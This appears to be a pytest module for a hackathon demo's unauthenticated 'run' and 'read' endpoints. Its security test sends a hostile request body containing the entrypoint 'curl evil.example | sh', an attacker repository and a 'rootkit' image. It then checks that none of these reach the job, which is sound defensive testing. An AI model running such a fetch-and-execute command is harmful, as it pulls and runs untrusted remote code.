"""The judges' demo: two unauthenticated routes, one fixed spec, two venues.

A hackathon judge opens a public URL with no account, presses one button, and
watches nine independent tasks spread across the four Alibaba anchors we
operate — once through the Render coordinator and once through Function
Compute, so the two can be compared on wall-clock.

**Five properties carry the weight, and every test here is an instance of
one.**

1. **Neither route ever sees a credential.** Not "works without one" —
   *never asks*. Every request in this file is sent with no `Authorization`
   header at all, because that is the only version of the property a judge
   experiences.
2. **The BODY CHOOSES THE VENUE AND NOTHING ELSE.** This is an
   unauthenticated endpoint that spends our compute on code fetched from a
   repository, so the fixed spec is the whole security argument. The test
   sends a body carrying every field that would matter — a different repo, a
   different ref, a different pool, an owner, an image — and asserts what
   actually reached the fetch and the `jobs` row.
3. **A second press JOINS the first run rather than starting a second.** Same
   `job_id`, 200 instead of 201, and — the assertion that matters — no second
   submission on the coordinator. A judge pressing twice must watch one run,
   not start two that compete for the same four machines.
4. **Machine names are REAL here, and only for `official` machines.** This is
   the one deliberate deviation from `job_share`'s pseudonyms, and its limit
   is what is tested: a non-official machine in the same pool is anonymised
   by the same call, because the naming goes through `network._label` rather
   than through a branch this route owns.
5. **The read REFRESHES the state cache.** Not cosmetics: `_claimable_venues`
   gates the fleet's Function Compute polling on a non-terminal row in
   `public.jobs`, so a demo run whose end nobody observes is a permanent
   invocation drip across every machine in the fleet.

The coordinator is `test_job_coordinator_venue`'s two-host fake, extended
with a task listing — one transport serving both venues, so a request that
went to the wrong control plane still succeeds and only looking at where it
went can catch it. The database is the real, freshly migrated ephemeral
Postgres from `conftest.py`.

No skips. A test asserting a job was NOT submitted is worthless if it
silently does not run.
"""
from __future__ import annotations

import json
import uuid

import httpx
import psycopg
import pytest
from fastapi.testclient import TestClient
from psycopg.rows import dict_row

from flashml_cloud_api import db as dbmod
from flashml_cloud_api import demo as demomod
from flashml_cloud_api.app import create_cloud_app
from flashml_cloud_api.settings import Settings

from test_job_coordinator_venue import (  # noqa: F401 - the two-venue fake
    FC_TOKEN,
    FC_URL,
    RENDER_URL,
    TwoVenueTransport,
)
from test_jobs_from_repo import (  # noqa: F401 - fixtures and builders
    CLEAN_REPO,
    JWT_SECRET,
    OPERATOR_TOKEN,
    RecordingFetch,
    _new_user,
    db,
    make_tarball,
)

#: The four anchors, named as they are named in production. The point of the
#: deviation from `job_share` is that THESE strings reach the page.
ANCHORS = ("alibaba-sgp-1", "alibaba-sgp-2", "alibaba-sgp-3", "alibaba-sgp-4")

#: A volunteer hostname of exactly the shape the demo must never publish, on a
#: machine that is in the demo pool but is NOT official. `enrolment.py` writes
#: `name=row["hostname"]`, and volunteer hostnames are personal.
VOLUNTEER_HOSTNAME = "phong-macbook-air.local"

#: What a judge's browser sends: nothing.
NO_AUTH: dict[str, str] = {}


# ---------------------------------------------------------------------------
# the coordinator
# ---------------------------------------------------------------------------


class DemoTransport(TwoVenueTransport):
    """The two-venue fake plus a task listing and a settable job state.

    `TwoVenueTransport` answers `/tasks` with `[]`, which is right for its own
    module and useless here: the demo page's task grid is built by MERGING the
    coordinator's task list (which knows about the tasks nobody has claimed
    yet) with our own attempt rows (which know the timings and the machine),
    and a fake with no tasks could not exercise the merge at all.

    `set_state` exists because the one-run-per-venue gate is decided against
    what the COORDINATOR says, not against the status column recorded at
    submit — a finished run whose end nobody observed must not block the
    button for ever.
    """

    def __init__(self) -> None:
        super().__init__()
        #: job_id -> the `/tasks` body. Absent means "fall through to the
        #: parent", which answers `[]`.
        self.tasks: dict[str, list[dict]] = {}

    def set_state(self, venue: str, job_id: str, state: str) -> None:
        record = self._jobs[venue].get(job_id)
        assert record is not None, f"{venue} has no job {job_id}"
        self._jobs[venue][job_id] = dict(record, state=state)

    def job_submissions_on(self, venue: str) -> list[httpx.Request]:
        return [
            r for r in self.requests
            if self._venue_of(r) == venue
            and r.method == "POST"
            and r.url.path == "/v1alpha1/jobs"
        ]

    async def handle_async_request(self, request: httpx.Request) -> httpx.Response:
        path = request.url.path
        if request.method == "GET" and path.endswith("/tasks"):
            job_id = path.split("/")[-2]
            if job_id in self.tasks:
                await request.aread()
                self.requests.append(request)
                return httpx.Response(200, json=self.tasks[job_id])
        return await super().handle_async_request(request)


# ---------------------------------------------------------------------------
# fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def transport() -> DemoTransport:
    return DemoTransport()


@pytest.fixture
def make_client(postgres_dsn, transport):
    """A deployment with BOTH venues configured — the demo compares them, so a
    single-venue deployment could not run half of it."""
    clients: list[TestClient] = []

    def build(files: dict[str, str] | None = None):
        def connect() -> psycopg.Connection:
            conn = psycopg.connect(
                postgres_dsn, row_factory=dict_row, connect_timeout=5
            )
            conn.autocommit = True
            return conn

        fetch = RecordingFetch(make_tarball(files or CLEAN_REPO))
        app = create_cloud_app(
            Settings(
                supabase_url="https://yualksqjjvlfscbbsygq.supabase.co",
                supabase_jwt_secret=JWT_SECRET,
                supabase_service_key="service-key-not-used-here",
                coordinator_url=RENDER_URL,
                coordinator_operator_token=OPERATOR_TOKEN,
                coordinator_url_fc=FC_URL,
                coordinator_operator_token_fc=FC_TOKEN,
                require_auth=True,
                database_url=postgres_dsn,
                console_url="https://console.example",
            ),
            connect=connect,
            transport=transport,
            fetch_repo=fetch,
        )
        client = TestClient(app)
        client.__enter__()
        clients.append(client)
        client.fetch = fetch  # type: ignore[attr-defined]
        return client

    yield build
    for client in clients:
        client.__exit__(None, None, None)


# ---------------------------------------------------------------------------
# helpers
#
# The demo's reads are DEPLOYMENT-WIDE by design — one run per venue for the
# whole product, not per account — so every test starts from a quiet fleet and
# creates whatever it needs itself. Scoped to demo-marked rows, so nothing
# another module in this session wrote is touched.
# ---------------------------------------------------------------------------


def _clear_demo_runs(db) -> None:
    """Every demo row this session has left behind, gone.

    DELETED rather than marked finished, and the difference matters: the
    reads under test pick the NEWEST run per venue, so a retired row from an
    earlier test is still the row a test that backdates its own job would be
    handed. Scoped to the demo marker, which nothing outside this module ever
    writes, so no other module's fixtures are touched.
    """
    with db.cursor() as cur:
        cur.execute("delete from public.jobs where source->>'demo' = 'true'")


@pytest.fixture(autouse=True)
def quiet_fleet(db):
    _clear_demo_runs(db)
    yield
    _clear_demo_runs(db)


def _demo_ready(db) -> str:
    """The deployment the demo needs: an admitted profile and the demo pool.

    Returns the owner id the route will resolve — `demo_owner_id` picks the
    FIRST admitted profile by `created_at`, and other modules in this session
    have admitted profiles of their own, so the test asks the same function
    rather than assuming its own user won.
    """
    _new_user(db)  # ensure at least one admitted profile exists
    owner_id = demomod.demo_owner_id(db)
    assert owner_id is not None
    with db.cursor() as cur:
        cur.execute(
            "insert into public.pools (id, name, owner_id) values"
            " (%s::uuid, 'Test-1', %s::uuid) on conflict (id) do nothing",
            (demomod.DEMO_POOL_ID, owner_id),
        )
    return owner_id


def _anchor(db, owner_id: str, name: str, *, official: bool = True,
            online: bool = True) -> str:
    """One machine in the demo pool.

    `official` is set through the column migration 0030 added rather than
    through `network.set_machine_official`, which is owner-scoped and needs a
    request behind it; the flag's MEANING is what this file tests, and the
    flag is read by `network._label` off the row either way.
    """
    machine_id = dbmod.insert_machine(
        db,
        owner_id=owner_id,
        node_id=f"node-{uuid.uuid4().hex[:10]}",
        name=name,
        platform="Linux-6.8.0-x86_64",
    )
    with db.cursor() as cur:
        cur.execute(
            """
            update public.machines
               set official = %s,
                   status = 'active',
                   last_seen_at = case when %s then now()
                                       else now() - interval '1 hour' end,
                   capabilities = %s::jsonb,
                   geo_country = 'SG'
             where id = %s::uuid
            """,
            (
                official,
                online,
                json.dumps({"cpu_cores": 2, "memory_bytes": 8 * 1024**3}),
                machine_id,
            ),
        )
        cur.execute(
            "insert into public.machine_pools (machine_id, pool_id)"
            " values (%s::uuid, %s::uuid) on conflict do nothing",
            (machine_id, demomod.DEMO_POOL_ID),
        )
    return machine_id


def _fleet_of_four(db, owner_id: str) -> list[str]:
    return [_anchor(db, owner_id, name) for name in ANCHORS]


def _press(client, **body):
    """The button. NO AUTHORIZATION HEADER, ever, in this file."""
    return client.post(
        "/v1alpha1/public/demo/run", json=body, headers=NO_AUTH
    )


def _read(client):
    return client.get("/v1alpha1/public/demo", headers=NO_AUTH)


def _job_row(db, job_id: str) -> dict:
    with db.cursor() as cur:
        cur.execute("select * from public.jobs where id = %s", (job_id,))
        row = cur.fetchone()
    assert row is not None, f"no jobs row for {job_id}"
    return row


def _accepted_attempt(db, *, job_id: str, machine_id: str, task_id: str) -> None:
    """One lease claimed and accepted, through the real writers — the same
    two functions `test_public_job_share` uses, so the timings this page
    publishes come from the rows production actually writes."""
    lease_id = f"lease-{uuid.uuid4().hex[:12]}"
    dbmod.record_attempt(
        db, lease_id=lease_id, machine_id=machine_id, job_id=job_id,
        task_id=task_id,
    )
    assert dbmod.claim_attempt_credit(
        db, lease_id=lease_id, machine_id=machine_id
    ) is not None


# ---------------------------------------------------------------------------
# 1. no credential, ever
# ---------------------------------------------------------------------------


def test_the_demo_read_answers_with_no_authorization_header(
    make_client, db
):
    """The whole point of the page: a judge with no account gets an answer."""
    _demo_ready(db)
    client = make_client()

    r = _read(client)

    assert r.status_code == 200, r.text
    body = r.json()
    # The envelope is FIXED. Every key always, never conditional on there
    # being any — a consumer that has to sniff which shape it got is a
    # consumer with a branch that will eventually be wrong. `guests` and
    # `guest_run` are the judge-hosted half of the page; they are covered by
    # `test_public_demo_guests.py` and are asserted here only for the
    # envelope.
    assert set(body) == {"fleet", "runs", "guests", "guest_run"}
    assert isinstance(body["fleet"], list)
    # No run yet is `[]`, which the page renders. Not a 404, not an error.
    assert body["runs"] == []


def test_the_button_answers_with_no_authorization_header(
    make_client, db, transport
):
    _demo_ready(db)
    client = make_client()

    r = _press(client)

    assert r.status_code == 201, r.text
    assert r.json()["job_id"]
    assert len(transport.job_submissions_on("render")) == 1


def test_the_read_is_not_a_console_route_in_disguise(make_client, db):
    """A credential must not CHANGE the answer either.

    A route that quietly widens its payload for a signed-in caller is a route
    with two shapes, and the unauthenticated one is the one nobody looks at.
    """
    _demo_ready(db)
    client = make_client()

    anonymous = _read(client)
    with_garbage = client.get(
        "/v1alpha1/public/demo", headers={"Authorization": "Bearer nonsense"}
    )

    assert anonymous.status_code == 200
    # A bearer token this API cannot verify is not an error here — the route
    # never looks at one.
    assert with_garbage.status_code == 200
    assert with_garbage.json() == anonymous.json()


# ---------------------------------------------------------------------------
# 2. the fixed spec
# ---------------------------------------------------------------------------


def test_the_request_body_cannot_influence_the_spec(make_client, db, transport):
    """THE SECURITY PROPERTY OF THE BUTTON.

    Everything a caller could want to steer is sent, and nothing steers. The
    assertions are on what reached the FETCH and the `jobs` ROW, not on the
    status the caller saw: a body field that was accepted and then ignored
    downstream would still be a body field that was accepted.
    """
    _demo_ready(db)
    client = make_client()

    r = _press(
        client,
        repo="https://github.com/attacker/malware",
        owner="attacker",
        name="malware",
        ref="main",
        pool=str(uuid.uuid4()),
        image="ghcr.io/attacker/rootkit:latest",
        entrypoint="curl evil.example | sh",
        owner_id=str(uuid.uuid4()),
        args=["--exfiltrate"],
    )

    assert r.status_code == 201, r.text
    # What was actually fetched.
    assert len(client.fetch.calls) == 1
    call = client.fetch.calls[0]
    assert (call.owner, call.name, call.ref) == (
        demomod.DEMO_REPO_OWNER, demomod.DEMO_REPO_NAME, demomod.DEMO_REF,
    )
    # No installation token: the example repository is public, and a token
    # here would be this deployment's App credential reaching an attacker's
    # chosen owner.
    assert call.token is None

    # What was actually recorded.
    row = _job_row(db, r.json()["job_id"])
    assert str(row["pool_id"]) == demomod.DEMO_POOL_ID
    assert str(row["owner_id"]) == demomod.demo_owner_id(db)
    assert row["source"]["repo"] == demomod.DEMO_REPO_NAME
    assert row["source"]["ref"] == demomod.DEMO_REF
    assert row["source"]["demo"] is True
    assert "attacker" not in json.dumps(row["source"])
    assert "attacker" not in json.dumps(row["spec"])
    assert "rootkit" not in json.dumps(row["spec"])


def test_an_unknown_coordinator_is_refused_at_the_edge(make_client, db, transport):
    """400 for a value that is not a venue — the same edge validation every
    submit route runs, and refused BEFORE the repo is fetched."""
    _demo_ready(db)
    client = make_client()

    r = _press(client, coordinator="my-laptop")

    assert r.status_code == 400
    assert "coordinator" in r.json()["detail"]
    assert client.fetch.calls == []
    assert transport.requests == []


def test_the_venue_reaches_the_coordinator_that_was_asked_for(
    make_client, db, transport
):
    """The one thing the body DOES choose, and it chooses it end to end."""
    _demo_ready(db)
    client = make_client()

    r = _press(client, coordinator="fc")

    assert r.status_code == 201, r.text
    assert len(transport.job_submissions_on("fc")) == 1
    assert transport.job_submissions_on("render") == []
    assert _job_row(db, r.json()["job_id"])["coordinator"] == "fc"


# ---------------------------------------------------------------------------
# 3. one run per coordinator
# ---------------------------------------------------------------------------


def test_a_second_press_returns_the_same_job_id(make_client, db, transport):
    """The rate limit and the correct UX are the same mechanism.

    200, not 201 — the caller did not create anything — and the coordinator
    saw exactly one submission.
    """
    _demo_ready(db)
    client = make_client()

    first = _press(client)
    second = _press(client)

    assert first.status_code == 201, first.text
    assert second.status_code == 200, second.text
    assert second.json()["job_id"] == first.json()["job_id"]
    assert second.json()["already_running"] is True
    assert len(transport.job_submissions_on("render")) == 1
    # And no second fetch of the repo either: the gate runs before any of the
    # submit path's work, not after it.
    assert len(client.fetch.calls) == 1


def test_the_gate_is_per_coordinator_not_global(make_client, db, transport):
    """A live Render run must never stop somebody starting the FC one — the
    two side by side ARE the demo."""
    _demo_ready(db)
    client = make_client()

    render = _press(client, coordinator="render")
    fc = _press(client, coordinator="fc")

    assert render.status_code == 201, render.text
    assert fc.status_code == 201, fc.text
    assert fc.json()["job_id"] != render.json()["job_id"]
    assert len(transport.job_submissions_on("render")) == 1
    assert len(transport.job_submissions_on("fc")) == 1


def test_a_finished_run_does_not_block_the_button_for_ever(
    make_client, db, transport
):
    """The gate is decided against what the COORDINATOR says.

    `jobs.status` is a cache written at submit and updated only when somebody
    observes the end. Gating on the column alone would leave the button dead
    after the first run — which is exactly how a demo fails on the day.
    """
    _demo_ready(db)
    client = make_client()

    first = _press(client)
    first_id = first.json()["job_id"]
    transport.set_state("render", first_id, "SUCCEEDED")

    second = _press(client)

    assert second.status_code == 201, second.text
    assert second.json()["job_id"] != first_id
    assert len(transport.job_submissions_on("render")) == 2
    # ...and the observation was WRITTEN, not merely noticed. This is the
    # invocation-drip fix: `_claimable_venues` reads this column.
    row = _job_row(db, first_id)
    assert row["status"] == "SUCCEEDED"
    assert row["finished_at"] is not None


# ---------------------------------------------------------------------------
# 4. what the page shows
# ---------------------------------------------------------------------------


def test_official_machines_show_their_real_names(make_client, db, transport):
    """THE ONE DEVIATION FROM `job_share`, in both places it appears.

    The fleet cards and the per-task placement both name the anchors, because
    `machines.official` is exactly the flag that says this capacity has a
    named, accountable operator.
    """
    owner_id = _demo_ready(db)
    machines = _fleet_of_four(db, owner_id)
    client = make_client()

    job_id = _press(client).json()["job_id"]
    # Nine tasks, four machines — the grid the demo exists to show.
    transport.tasks[job_id] = [
        {"task_id": f"trial-{i:03d}", "state": "PENDING", "attempts": 0,
         "max_attempts": 3, "node_id": None, "deadline": None}
        for i in range(9)
    ]
    for i in range(4):
        _accepted_attempt(
            db, job_id=job_id, machine_id=machines[i],
            task_id=f"trial-{i:03d}",
        )

    body = _read(client).json()

    assert [m["name"] for m in body["fleet"]] == list(ANCHORS)
    assert all(m["official"] for m in body["fleet"])
    assert all(m["online"] for m in body["fleet"])
    assert {m["region"] for m in body["fleet"]} == {"SG"}
    assert {m["cpus"] for m in body["fleet"]} == {2}
    assert {m["memory_gb"] for m in body["fleet"]} == {8.0}

    run = body["runs"][0]
    assert run["job_id"] == job_id
    assert run["coordinator"] == "render"
    assert len(run["tasks"]) == 9
    placed = {t["task_id"]: t["machine"] for t in run["tasks"] if t["machine"]}
    assert placed == {
        f"trial-{i:03d}": ANCHORS[i] for i in range(4)
    }
    # The timings a comparison needs, per task and per run.
    ran = [t for t in run["tasks"] if t["machine"]]
    assert all(t["started_at"] and t["finished_at"] for t in ran)
    assert all(t["outcome"] == "accepted" for t in ran)
    assert isinstance(run["elapsed_s"], float)


def test_a_non_official_machine_in_the_pool_is_still_anonymised(
    make_client, db, transport
):
    """THE LIMIT OF THE DEVIATION, and the reason it is safe to ship.

    The naming goes through `network._label`, so a volunteer machine that ends
    up bound to the demo pool is pseudonymised without this route knowing
    anything about it. The hostname is searched for in the RAW BYTES, not
    merely under a key: a refactor that reintroduces it under a different name
    passes a key check and fails this one.
    """
    owner_id = _demo_ready(db)
    volunteer = _anchor(db, owner_id, VOLUNTEER_HOSTNAME, official=False)
    _anchor(db, owner_id, ANCHORS[0])
    client = make_client()

    job_id = _press(client).json()["job_id"]
    _accepted_attempt(
        db, job_id=job_id, machine_id=volunteer, task_id="trial-000"
    )

    r = _read(client)

    assert VOLUNTEER_HOSTNAME not in r.text
    assert "phong" not in r.text
    body = r.json()
    names = [m["name"] for m in body["fleet"]]
    assert ANCHORS[0] in names
    assert any(n.startswith("prov") for n in names)
    task = body["runs"][0]["tasks"][0]
    assert task["task_id"] == "trial-000"
    assert task["machine"].startswith("prov")


def test_artifacts_are_listed_with_their_sizes(make_client, db, transport):
    """A judge has to see that something came OUT."""
    _demo_ready(db)
    client = make_client()

    job_id = _press(client).json()["job_id"]
    transport.seed_artifact(
        "render", f"jobs/{job_id}/trial-000/metrics.json", b'{"accuracy":0.95}'
    )

    run = _read(client).json()["runs"][0]

    assert run["artifacts"] == [
        {"name": "trial-000/metrics.json", "bytes": 17}
    ]


def test_both_runs_are_returned_newest_first(make_client, db, transport):
    """At most two — one per coordinator — which is the comparison."""
    _demo_ready(db)
    client = make_client()

    render_id = _press(client, coordinator="render").json()["job_id"]
    fc_id = _press(client, coordinator="fc").json()["job_id"]

    runs = _read(client).json()["runs"]

    assert [r["job_id"] for r in runs] == [fc_id, render_id]
    assert [r["coordinator"] for r in runs] == ["fc", "render"]


# ---------------------------------------------------------------------------
# 5. the state cache, and degrading rather than breaking
# ---------------------------------------------------------------------------


def test_the_read_writes_down_a_terminal_state(make_client, db, transport):
    """THE INVOCATION-DRIP FIX.

    `_claimable_venues` decides whether the whole fleet polls Function Compute
    by looking for a non-terminal `fc` row in `public.jobs`. Nothing else
    updates that column for a Mode A job, so if this page did not observe the
    end, a single demo run would keep every machine invoking FC for ever.
    """
    _demo_ready(db)
    client = make_client()

    job_id = _press(client, coordinator="fc").json()["job_id"]
    assert _job_row(db, job_id)["finished_at"] is None
    transport.set_state("fc", job_id, "SUCCEEDED")

    run = _read(client).json()["runs"][0]

    assert run["state"] == "SUCCEEDED"
    assert run["finished_at"] is not None
    row = _job_row(db, job_id)
    assert row["status"] == "SUCCEEDED"
    assert row["finished_at"] is not None


def test_a_run_older_than_the_max_age_is_cancelled(make_client, db, transport):
    """The backstop for the run nobody comes back to.

    The fixed spec takes ~390 s, so anything past `DEMO_MAX_AGE_S` is stuck
    rather than slow — and a stuck FC run is not a stale row, it is the drip.
    """
    _demo_ready(db)
    client = make_client()

    job_id = _press(client, coordinator="fc").json()["job_id"]
    with db.cursor() as cur:
        cur.execute(
            "update public.jobs set created_at = now() - interval '2 days'"
            " where id = %s",
            (job_id,),
        )

    run = _read(client).json()["runs"][0]

    assert run["state"] == "CANCELLED"
    assert _job_row(db, job_id)["finished_at"] is not None
    assert f"/v1alpha1/jobs/{job_id}/cancel" in transport.paths_on("fc")
    # And the button works again, because the venue is quiet.
    assert _press(client, coordinator="fc").status_code == 201


def test_the_page_renders_when_the_coordinator_is_down(
    make_client, db, transport
):
    """A coordinator that is not answering costs the page a SECTION, never
    the response. The evidence that matters most — the fleet, the timings,
    which machine ran what — is all ours and comes out of Postgres."""
    owner_id = _demo_ready(db)
    machines = _fleet_of_four(db, owner_id)
    client = make_client()

    job_id = _press(client).json()["job_id"]
    _accepted_attempt(
        db, job_id=job_id, machine_id=machines[1], task_id="trial-000"
    )
    transport.dead.add("render")

    r = _read(client)

    assert r.status_code == 200, r.text
    run = r.json()["runs"][0]
    assert run["job_id"] == job_id
    assert run["artifacts"] == []
    # One task — the coordinator could not name the other eight — with its
    # state DERIVED from our own attempt outcome rather than left blank.
    assert len(run["tasks"]) == 1
    assert run["tasks"][0]["machine"] == ANCHORS[1]
    assert run["tasks"][0]["state"] == "COMPLETED"
    assert run["tasks"][0]["outcome"] == "accepted"


def test_an_unconfigured_deployment_refuses_rather_than_half_starting(
    make_client, db, transport
):
    """No demo pool means no job, and the refusal lands BEFORE anything is
    fetched, staged or submitted.

    `jobs.pool_id` is a foreign key and `insert_job` runs after the
    coordinator has accepted, so discovering this late would leave a running
    job with no row to cancel it by.
    """
    with db.cursor() as cur:
        cur.execute(
            "delete from public.pools where id = %s::uuid",
            (demomod.DEMO_POOL_ID,),
        )
    client = make_client()

    r = _press(client)

    assert r.status_code == 503
    assert client.fetch.calls == []
    assert transport.requests == []
